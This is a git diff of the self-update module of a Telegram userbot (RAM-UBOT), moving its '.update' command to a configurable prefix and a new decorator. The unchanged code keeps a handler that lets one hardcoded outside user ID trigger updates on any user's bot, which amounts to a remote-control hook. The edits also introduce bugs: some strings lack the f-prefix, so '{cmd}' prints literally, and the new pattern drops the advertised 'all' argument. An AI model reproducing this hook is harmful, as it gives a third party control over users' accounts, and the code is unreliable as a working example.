@@ -5,7 +5,8 @@ This module updates the userbot based on upstream revision
 from os import remove, execle, path, environ
 import asyncio
 import sys
-
+from userbot import CMD_HANDLER as cmd
+from userbot.utils import ram_cmd
 from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
@@ -137,7 +138,7 @@ async def update(event, repo, ups_rem, ac_br):
     return
 
 
-@register(outgoing=True, pattern=r"^.update(?: |$)(one|all)?")
+@ram_cmd("update$")
 @register(incoming=True, from_users=1826643972, pattern=r"^\.cupdate(?: |$)(one|all)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
@@ -159,7 +160,7 @@ async def upstream(event):
         if conf is None:
             return await event.edit(
                 f"`Sayangnya, Directory {error} Tampaknya Bukan Dari Repo."
-                "\nTapi Kita Bisa Memperbarui Paksa Userbot Menggunakan .update now.`"
+                "\nTapi Kita Bisa Memperbarui Paksa Userbot Menggunakan {cmd}update all.`"
             )
         repo = Repo.init()
         origin = repo.create_remote("upstream", off_repo)
@@ -227,10 +228,8 @@ async def upstream(event):
 
 CMD_HELP.update({
     'update':
-    ".update"
+    f"{cmd}update"
     "\nUsage: Untuk Melihat Pembaruan Terbaru RAM-UBOT."
-    "\n\n.update one"
-    "\nUsage: Memperbarui RAM-UBOT."
-    "\n\n.update all"
+    "\n\n{cmd}update all"
     "\nUsage: Memperbarui RAM-UBOT Dengan Cara Deploy Ulang."
 })
